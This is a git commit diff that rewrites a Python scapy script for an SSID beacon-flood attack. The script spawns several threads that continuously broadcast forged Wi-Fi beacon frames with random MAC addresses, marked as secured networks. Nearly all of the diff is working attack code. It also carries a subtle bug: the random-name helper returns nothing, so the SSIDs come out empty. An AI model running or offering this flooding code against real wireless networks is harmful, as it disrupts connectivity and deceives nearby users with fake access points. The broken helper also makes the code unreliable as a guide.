8a9975e6ad46a90f38c62cb41f89f67551bb4785
Webblitchy <55515713+Webblitchy@users.noreply.github.com>
2023-03-30 13:55:36 +0200

    new v

--- scripts/3_SSID_flood_attack.py
+++ scripts/3_SSID_flood_attack.py
@@ -3,24 +3,41 @@ from scapy.layers.dot11 import *
 from scapy.utils import *
 from random import random
 from config import WIFI_INTERFACE_NAME
+from threading import Thread
 
 # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dot11.html
-ssids = ["wifi1", "wifi2", "wifi3"]
-wifi_name = randstring(math.floor(random() * 6) + 5)
 
-wifi_ssid = "test-wifi"
-randomSenderMac = RandMAC()
+# sendp(
+#     RadioTap()
+#     / Dot11(
+#         addr1="ff:ff:ff:ff:ff:ff", addr2=randomSenderMac, addr3=randomSenderMac
+#     )
+#     / Dot11Beacon(cap="ESS", timestamp=1)
+#     / Dot11Elt(ID="SSID", info=wifi_ssid)
+#     / Dot11EltRates(rates=[130, 132, 11, 22])
+#     / Dot11Elt(ID="DSset", info="\x03")
+#     / Dot11Elt(ID="TIM", info="\x00\x01\x00\x00"),
+#     iface=WIFI_INTERFACE_NAME,
+#     loop=1,
+# )
 
-sendp(
-    RadioTap()
-    / Dot11(
-        addr1="ff:ff:ff:ff:ff:ff", addr2="00:01:02:03:04:05", addr3="00:01:02:03:04:05"
-    )
-    / Dot11Beacon(cap="ESS", timestamp=1)
-    / Dot11Elt(ID="SSID", info=wifi_ssid)
-    / Dot11EltRates(rates=[130, 132, 11, 22])
-    / Dot11Elt(ID="DSset", info="\x03")
-    / Dot11Elt(ID="TIM", info="\x00\x01\x00\x00"),
-    iface=WIFI_INTERFACE_NAME,
-    loop=1,
-)
+
+def send_beacon(ssid, mac):
+    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
+    # ESS+privacy to appear as secured on some devices
+    beacon = Dot11Beacon(cap="ESS+privacy")
+    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+    frame = RadioTap() / dot11 / beacon / essid
+    sendp(frame, inter=0.1, loop=1, iface=WIFI_INTERFACE_NAME, verbose=0)
+
+
+def random_wifi_name():
+    randstring(math.floor(random() * 6) + 5)
+
+
+if __name__ == "__main__":
+    # number of access points
+    n_ap = 5
+
+    for _ in range(n_ap):
+        Thread(target=send_beacon, args=(random_wifi_name(), RandMAC())).start()
